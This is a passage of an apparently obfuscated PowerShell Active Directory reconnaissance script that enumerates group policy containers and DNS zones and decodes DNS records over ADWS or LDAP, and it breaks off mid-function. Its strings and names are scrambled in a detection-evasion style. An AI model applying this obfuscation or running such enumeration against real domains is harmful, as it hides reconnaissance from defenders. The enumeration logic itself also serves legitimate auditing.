            Return $null
        }
        $ObjSearcher.("{0}{1}{2}" -f 'd','isp','ose').Invoke()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."Page`SiZE" = $PageSize
        $ObjSearcher."F`IlTER" = ("{1}{0}{5}{2}{6}{3}{4}"-f'bjectCat','(o','oup','C','ontainer)','egory=gr','Policy')
        $ObjSearcher."sEARc`HSC`OpE" = ("{2}{1}{0}" -f'ee','btr','Su')

        Try
        {
            $ADGPOs = $ObjSearcher.("{0}{1}"-f 'Find','All').Invoke()
        }
        Catch
        {
            Write-Warning ("{13}{1}{0}{12}{2}{5}{14}{6}{3}{10}{4}{8}{7}{9}{11}" -f'-','Get','DRGPL',' e','rating groupPolicyCo','ink] Error w','e','tainer ','n','Objec','nume','ts','A','[','hil')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{2}{1}{0}" -f 'se','ispo','d').Invoke()

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs)) "
            $SOMObj =   (  gCi  VARiaBLE:3y9  ).Value::("{2}{1}{0}"-f 'er','rs','SOMPa').Invoke($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($SOMObj)
    {
        Return $SOMObj
    }
    Else
    {
        Return $null
    }
}


Function Convert-DNSRecord
{


    [OutputType({"{3}{4}{5}{1}{6}{9}{7}{8}{0}{2}"-f'Objec','em','t','System','.Ma','nag','ent.Automati','us','tom','on.PSC'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTION = 0, manDAtOrY = $True, ValuefROMPipeLINEbYProPERTYNaME = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{5}{1}{0}{3}" -f 'tTypeCorrec','utpu','e','tly','PSUs','O'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0)
                {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS
    {
        
        $RDataType =   (  vAriABle  ("8"+"zv")).VAlue::("{2}{0}{1}" -f'In','t16','ToU').Invoke($DNSRecord, 2)
        $UpdatedAtSerial =  $8ZV::("{0}{1}"-f'ToUI','nt32').Invoke($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        
        $Null =   (  gi varIABLe:fXI4gu  ).VaLUe::("{0}{2}{1}"-f'R','erse','ev').Invoke($TTLRaw)
        $TTL =  (  vArIAbLe 8zV  -Val)::("{1}{2}{0}"-f'Int32','T','oU').Invoke($TTLRaw, 0)

        $Age =   $8ZV::("{2}{1}{0}"-f'2','3','ToUInt').Invoke($DNSRecord, 20)
        If ($Age -ne 0)
        {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{0}{1}"-f 'AddHou','rs').Invoke($age)).("{1}{2}{0}"-f 'ring','ToS','t').Invoke()
        }
        Else
        {
            $TimeStamp = ("{2}{1}{0}"-f'c]','ti','[sta')
        }

        $DNSRecordObject = New-Object PSObject

        switch ($RDataType)
        {
            1
            {
                $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
                $Data = $IP
                $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{2}" -f'rdTy','Reco','pe') 'A'
            }

            2
            {
                $NSName = Get-Name $DNSRecord[24..$DNSRecord."LeNG`Th"]
                $Data = $NSName
                $DNSRecordObject | Add-Member Noteproperty ("{0}{1}{3}{2}" -f'R','ecord','e','Typ') 'NS'
            }

            5
            {
                $Alias = Get-Name $DNSRecord[24..$DNSRecord."l`E`NGtH"]
                $Data = $Alias
                $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}" -f 'pe','R','ecordTy') ("{0}{1}" -f 'C','NAME')
            }

            6
            {
                $PrimaryNS = Get-Name $DNSRecord[44..$DNSRecord."Leng`TH"]
                $ResponsibleParty = Get-Name $DNSRecord[$(46+$DNSRecord[44])..$DNSRecord."l`eN`gTH"]
                $SerialRaw = $DNSRecord[24..27]
                
                $Null =   (  diR  vAriAble:fxi4gU  ).VaLue::("{0}{1}{2}" -f 'Re','vers','e').Invoke($SerialRaw)
                $Serial =  ( VaRIaBlE 8zv -valUeOnL)::("{0}{2}{1}"-f'ToUI','2','nt3').Invoke($SerialRaw, 0)

                $RefreshRaw = $DNSRecord[28..31]
                $Null =  (gi  ("V"+"AriaBl"+"e:FXi4"+"g"+"U")  ).vALUE::("{0}{1}"-f'Rever','se').Invoke($RefreshRaw)
                $Refresh =  (vARiaBle  ('8Z'+'V')  ).VALUE::("{0}{2}{1}"-f'T','nt32','oUI').Invoke($RefreshRaw, 0)

                $RetryRaw = $DNSRecord[32..35]
                $Null =   (VArIablE ("F"+"xi4gu")  -vA  )::("{0}{2}{1}" -f'Re','rse','ve').Invoke($RetryRaw)
                $Retry =  $8zv::("{0}{1}{2}"-f 'ToU','In','t32').Invoke($RetryRaw, 0)

                $ExpiresRaw = $DNSRecord[36..39]
                $Null =   $fxI4GU::("{1}{0}"-f'everse','R').Invoke($ExpiresRaw)
                $Expires =  (  get-vARIaBle  ("8"+"zV")).ValuE::("{1}{0}"-f'32','ToUInt').Invoke($ExpiresRaw, 0)

                $MinTTLRaw = $DNSRecord[40..43]
                $Null =  $FXI4gU::("{1}{2}{0}" -f'se','R','ever').Invoke($MinTTLRaw)
                $MinTTL =  (  get-ITEM vAriAble:8Zv  ).value::("{1}{2}{0}"-f't32','To','UIn').Invoke($MinTTLRaw, 0)

                $Data = "[" + $Serial + "][" + $PrimaryNS + "][" + $ResponsibleParty + "][" + $Refresh + "][" + $Retry + "][" + $Expires + "][" + $MinTTL + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{3}{0}{2}{1}" -f'c','ype','ordT','Re') 'SOA'
            }

            12
            {
                $Ptr = Get-Name $DNSRecord[24..$DNSRecord."L`Ength"]
                $Data = $Ptr
                $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}"-f'ype','Rec','ordT') 'PTR'
            }

            13
            {
                [string]$CPUType = ""
                [string]$OSType  = ""
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $CPUType += [char]$DNSRecord[$Index++]
                }
                $Index = 24 + $DNSRecord[24] + 1
                [int]$SegmentLength = $Index++
                while ($SegmentLength-- -gt 0)
                {
                    $OSType += [char]$DNSRecord[$Index++]
                }
                $Data = "[" + $CPUType + "][" + $OSType + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{2}" -f 'T','Record','ype') ("{0}{1}" -f 'HIN','FO')
            }

            15
            {
                $PriorityRaw = $DNSRecord[24..25]
                
                $Null =   (  variaBlE ('FXI4g'+'u') -vALUEOnl)::("{2}{0}{1}" -f've','rse','Re').Invoke($PriorityRaw)
                $Priority =  (GCi  ("VA"+"RIA"+"b"+"lE:8ZV")).Value::("{2}{0}{1}"-f 'n','t16','ToUI').Invoke($PriorityRaw, 0)
                $MXHost   = Get-Name $DNSRecord[26..$DNSRecord."L`enGTh"]
                $Data = "[" + $Priority + "][" + $MXHost + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{2}"-f'yp','RecordT','e') 'MX'
            }

            16
            {
                [string]$TXT  = ''
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $TXT += [char]$DNSRecord[$Index++]
                }
                $Data = $TXT
                $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}"-f 'e','R','ecordTyp') 'TXT'
            }

            28
            {
        		
                $AAAA = ""
                for ($i = 24; $i -lt 40; $i+=2)
                {
                    $BlockRaw = $DNSRecord[$i..$($i+1)]
                    
                    $Null =   (VarIABLe ('F'+'XI4'+'gu') -ValUeOnlY)::("{0}{1}"-f'Rever','se').Invoke($BlockRaw)
                    $Block =   $8ZV::("{0}{2}{1}"-f'To','nt16','UI').Invoke($BlockRaw, 0)
			        $AAAA += ($Block).("{0}{1}"-f 'ToStri','ng').Invoke('x4')
			        If ($i -ne 38)
                    {
                        $AAAA += ':'
                    }
                }
                $Data = $AAAA
                $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{1}" -f 'eco','rdType','R') ("{0}{1}" -f 'AAA','A')
            }

            33
            {
                $PriorityRaw = $DNSRecord[24..25]
                
                $Null =   (  GET-VARIABle ("Fx"+"I4Gu") -VaLU)::("{2}{0}{1}" -f 'v','erse','Re').Invoke($PriorityRaw)
                $Priority =   $8zV::("{0}{2}{1}"-f'T','t16','oUIn').Invoke($PriorityRaw, 0)

                $WeightRaw = $DNSRecord[26..27]
                $Null =  $FXi4gU::("{1}{0}"-f'verse','Re').Invoke($WeightRaw)
                $Weight =  (VariABlE 8zV ).vaLue::("{0}{1}"-f 'ToUI','nt16').Invoke($WeightRaw, 0)

                $PortRaw = $DNSRecord[28..29]
                $Null =  (  lS VaRIAbLe:FXi4GU ).vAlUe::("{0}{1}{2}"-f'Re','vers','e').Invoke($PortRaw)
                $Port =   $8Zv::("{2}{0}{1}" -f'U','Int16','To').Invoke($PortRaw, 0)

                $SRVHost = Get-Name $DNSRecord[30..$DNSRecord."L`En`GtH"]
                $Data = "[" + $Priority + "][" + $Weight + "][" + $Port + "][" + $SRVHost + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{2}"-f'ord','Rec','Type') 'SRV'
            }

            default
            {
                $Data = $(  (  LS ("v"+"aR"+"iA"+"bLE:93nB"+"JK")  ).vAlUE::"T`OBAs`E6`4strINg"($DNSRecord[24..$DNSRecord."L`engTh"]))
                $DNSRecordObject | Add-Member Noteproperty ("{1}{3}{0}{2}" -f'p','Re','e','cordTy') ("{0}{2}{1}"-f 'U','N','NKNOW')
            }
        }
        $DNSRecordObject | Add-Member Noteproperty ("{0}{4}{2}{3}{1}" -f 'Upd','l','tSer','ia','atedA') $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{1}"-f'meSta','mp','Ti') $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty ("{0}{1}" -f'Dat','a') $Data
        Return $DNSRecordObject
    }
}

Function Get-ADRDNSZone
{

    param(
        [Parameter(MANdaToRY = $true)]
        [string] $Method,

        [Parameter(mAnDaTOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MaNdaTORy = $false)]
        [string] $DomainController,

        [Parameter(manDAtorY = $false)]
        [Management.Automation.PSCredential] $Credential =  ( get-childITem  vaRiaBLE:q3CUvM ).VALUe::"e`mptY",

        [Parameter(maNDAtoRY = $true)]
        [int] $PageSize,

        [Parameter(mAnDaToRY = $true)]
        [string] $ADROutputDir,

        [Parameter(ManDaToRy = $true)]
        [array] $OutputType,

        [Parameter(mANDATorY = $false)]
        [bool] $ADRDNSZones = $true,

        [Parameter(MaNDAtOrY = $false)]
        [bool] $ADRDNSRecords = $false
    )

    If ($Method -eq ("{0}{1}"-f 'ADW','S'))
    {
        Try
        {
            $ADDNSZones = Get-ADObject -LDAPFilter (("{2}{3}{0}{1}" -f'las','s=dnsZone)','(ob','jectC')) -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning ("{4}{10}{12}{7}{6}{1}{2}{5}{11}{0}{3}{9}{8}" -f's','o','r while en','Zone ','[Get','umerat','e] Err','NSZon','jects','Ob','-AD','ing dn','RD')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{7}{2}{4}{8}{5}{0}{6}{3}{1}" -f'etting D','Context','-ADRDNSZo',' ','ne] Er','r g','omain','[Get','ro')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADDNSZones1 = Get-ADObject -LDAPFilter (("{2}{3}{0}{1}"-f 'sZon','e)','(ob','jectClass=dn')) -SearchBase "DC=DomainDnsZones,$($ADDomain.DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,$($ADDomain.DistinguishedName) dnsZone Objects "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            $ADDNSZones2 = Get-ADObject -LDAPFilter ("{2}{4}{1}{3}{0}{5}"-f'lass=dns','j','(','ectC','ob','Zone)') -SearchBase "DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=')" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=') dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If ($ADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $( $oBr::("{0}{1}{2}"-f'Cle','anStr','ing').Invoke($_."N`AMe"))
                Try
                {
                    $DNSNodes = Get-ADObject -SearchBase $($_."DISTiN`g`U`iShed`NAMe") -LDAPFilter ("{1}{0}{2}{3}{4}" -f 'bje','(o','ctClass=d','nsNode',')') -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj."na`mE"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $_."n`Ame"
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_."Dn`SR`eCoRD"[0]
                        }
                        Catch
                        {
                            Write-Warning ("{1}{11}{7}{12}{6}{2}{5}{4}{9}{10}{8}{0}{3}" -f 'or','[Get-ADRD','hile c','d','erti','onv','or w','Zone',' DNSRec','ng th','e','NS','] Err')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord."rECO`R`dTyPE"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord."D`AtA"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord."t`TL"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord."a`GE"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord."tiM`eS`TaMp"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord."updATe`dA`TsEr`IaL"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_."wH`eNcRe`ATED"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_."whE`NcH`ANGEd"
                        
                        
                        
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value $_."S`HowInAdva`NcEdVI`e`wOnly"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_."dIstIN`g`UIsh`eDnAmE"
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value $_."USnc`REa`TED"
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value $_."U`SNChANG`ED"
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_."whEn`C`REa`TED"
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_."WH`ENcHa`Ng`ED"
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_."dI`st`iNG`U`ish`EdnAMe"
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable DNSZoneArray
        }
    }

    If ($Method -eq ("{1}{0}"-f'P','LDA'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."Pag`EsIZe" = $PageSize
        $ObjSearcher."p`R`oPErT`iesTolOAD".("{2}{1}{0}"-f'dRange','d','A').Invoke((("{0}{1}" -f 'na','me'),("{0}{2}{1}"-f'wh','ed','encreat'),("{3}{0}{1}{2}" -f 'e','n','changed','wh'),("{1}{0}{2}"-f'ea','usncr','ted'),("{1}{0}{2}" -f 'snchang','u','ed'),("{1}{0}{3}{4}{2}"-f 'gui','distin','ame','shed','n')))
        $ObjSearcher."fi`ltER" = ("{0}{1}{2}{3}"-f'(objectClass=','d','nsZon','e)')
        $ObjSearcher."se`ArcHS`coPE" = ("{1}{2}{0}"-f'ee','Sub','tr')

        Try
        {
            $ADDNSZones = $ObjSearcher.("{0}{1}{2}"-f 'F','indAl','l').Invoke()
        }
        Catch
        {
            Write-Warning ("{6}{8}{1}{2}{0}{9}{3}{4}{7}{10}{11}{5}" -f 'NSZo','t','-ADRD','ror whil','e enumerating dnsZone Ob','s','[','j','Ge','ne] Er','ec','t')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.("{1}{0}" -f'ose','disp').Invoke()

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        $SearchPath = ("{0}{3}{2}{1}" -f 'DC=Do','nes','Zo','mainDns')
        If ($Credential -ne  $q3CuVM::"emp`Ty")
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential."u`SerN`AME",$Credential.("{5}{2}{0}{3}{1}{4}"-f'NetworkCr','e','et','ed','ntial','G').Invoke()."paS`SWo`Rd"
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath."Fi`LTer" = (("{4}{3}{5}{0}{1}{2}" -f '=dns','Zone',')','t','(objec','Class'))
        $objSearcherPath."Page`sI`zE" = $PageSize
        $objSearcherPath."P`ROPERtiEsT`OL`OAd".("{0}{1}{2}" -f 'AddRa','ng','e').Invoke((("{0}{1}"-f'nam','e'),("{1}{2}{3}{0}"-f'ated','w','hencr','e'),("{1}{2}{3}{0}" -f 'ged','whe','nc','han'),("{2}{1}{0}" -f 'eated','cr','usn'),("{0}{2}{1}" -f'us','changed','n'),("{1}{5}{3}{4}{2}{0}"-f 'name','di','hed','ng','uis','sti')))
        $objSearcherPath."SEA`RC`HS`Cope" = ("{1}{2}{0}" -f'tree','S','ub')

        Try
        {
            $ADDNSZones1 = $objSearcherPath.("{0}{1}"-f'Fin','dAll').Invoke()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),$($objDomain.distinguishedName) dnsZone Objects. "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.("{2}{0}{1}" -f 'spo','se','di').Invoke()

        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        $SearchPath = ("{3}{0}{4}{5}{2}{1}"-f 'C=Fo','nes','o','D','restDns','Z')
        If ($Credential -ne   $q3CuvM::"em`pTy")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DIStiNgU`isHE`DNa`Me")
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}" -f'omain','D'),$($DomainFQDN),$($Credential."U`S`erNAme"),$($Credential.("{2}{3}{4}{0}{1}"-f'r','edential','GetNe','tw','orkC').Invoke()."P`ASs`WorD"))
            Try
            {
                $ADDomain =  $wM35::("{0}{2}{1}" -f 'G','n','etDomai').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{3}{0}{7}{6}{2}{5}{1}{4}{8}{9}{10}" -f'AD','ettin','rro','[Get-','g','r g','st] E','RFore',' Do','mai','n Context')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')", $Credential."UserN`A`ME",$Credential.("{1}{0}{2}{3}"-f'tNe','Ge','two','rkCredential').Invoke()."passw`ORd"
        }
        Else
        {
            $ADDomain =   ( childIteM ('Va'+'riaB'+'le'+':wm35') ).VAluE::("{2}{0}{1}{3}" -f'u','rr','GetC','entDomain').Invoke()
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')"
        }

        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath."FIL`TER" = (("{1}{3}{4}{2}{0}"-f'ne)','(','sZo','objectC','lass=dn'))
        $objSearcherPath."Pa`gesI`Ze" = $PageSize
        $objSearcherPath."pROp`ErT`IEStolO`Ad".("{1}{0}{2}" -f'dRang','Ad','e').Invoke((("{0}{1}"-f 'na','me'),("{1}{0}{2}" -f'reat','whenc','ed'),("{3}{0}{1}{2}"-f'a','n','ged','whench'),("{1}{0}{2}" -f'ncreat','us','ed'),("{1}{2}{0}{3}" -f'ge','usnc','han','d'),("{2}{3}{0}{1}"-f 'edn','ame','distinguis','h')))
        $objSearcherPath."SeAR`ChSc`o`Pe" = ("{0}{1}"-f 'Subt','ree')

        Try
        {
            $ADDNSZones2 = $objSearcherPath.("{0}{1}" -f 'F','indAll').Invoke()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=') dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.("{2}{0}{1}"-f'ispos','e','d').Invoke()

        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If($ADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                If ($Credential -ne  ( GcI VaRIAbLE:Q3cUVm  ).vAlUe::"em`Pty")
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", $Credential."us`ERnAMe",$Credential.("{4}{2}{3}{0}{1}{5}{6}"-f'C','reden','r','k','GetNetwo','t','ial').Invoke()."Pa`SsWO`RD"
                }
                Else
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($_.Properties.distinguishedname)"
                }
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath."F`ilTEr" = ("{1}{0}{2}{4}{3}{5}{6}" -f'ctCla','(obje','ss=dns','o','N','de',')')
                $objSearcherPath."Pag`eSIze" = $PageSize
                $objSearcherPath."PRoPeR`TIe`Sto`LOaD".("{1}{0}"-f 'e','AddRang').Invoke((("{0}{1}{3}{2}" -f'dis','tingui','e','shednam'),("{1}{2}{0}" -f'd','dnsrec','or'),("{1}{0}"-f 'ame','n'),"dc",("{2}{4}{6}{3}{0}{5}{1}"-f 'nced','only','sho','a','wina','view','dv'),("{2}{1}{3}{0}"-f 'ed','e','wh','nchang'),("{0}{1}{2}"-f 'w','hencre','ated')))
                Try
                {
                    $DNSNodes = $objSearcherPath.("{1}{2}{0}"-f'dAll','Fi','n').Invoke()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                $objSearcherPath.("{2}{0}{1}"-f 'i','spose','d').Invoke()
                Remove-Variable objSearchPath

                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $( $3Y9::"C`L`eAnstRInG"($_."P`RoPERTI`ES"."NA`mE"[0]))
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj."N`AME"
                        $name = ([string] $($_."P`RO`perTIes"."NA`me"))
                        If (-Not $name)
                        {
                            $name = ([string] $($_."P`RoPE`RTIES"."Dc"))
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_."propER`TI`Es"."dnsr`eCoRd"[0]
                        }
                        Catch
                        {
                            Write-Warning ("{7}{6}{8}{4}{3}{1}{2}{5}{0}" -f'cord',' converting th','e DNS','e] Error while','NSZon','Re','Get-ADR','[','D')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord."Rec`o`Rdty`pE"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord."dA`TA"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord."T`TL"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord."a`GE"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord."tIMEs`TA`MP"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord."u`P`D`AtedatsErial"
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_."PR`oP`ertIEs"."whe`N`cr`eATed"))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_."P`R`opEr`Ties"."w`hENCh`AnGeD"))
                        
                        
                        
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] $($_."prope`R`TIes"."s`h`OwINAdVa`NCed`V`ieW`OnLY"))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_."p`RopER`TiES"."Di`sTInguI`S`HEDN`AME"))
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] $($_."pRO`Pe`RTIEs"."Us`NC`ReATED"))
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value ([string] $($_."pRopE`RtI`es"."UsNCh`A`NGeD"))
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_."PROp`ErT`iEs"."wH`encREa`T`Ed"))
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_."PrO`P`e`RtieS"."whEn`C`HAng`ed"))
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_."prOPE`R`TI`es"."d`istIn`GuiSh`EDNamE"))
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable DNSZoneArray
        }
    }

    If ($ADDNSZonesObj -and $ADRDNSZones)
    {
        Export-ADR $ADDNSZonesObj $ADROutputDir $OutputType ("{2}{1}{0}"-f's','ne','DNSZo')
        Remove-Variable ADDNSZonesObj
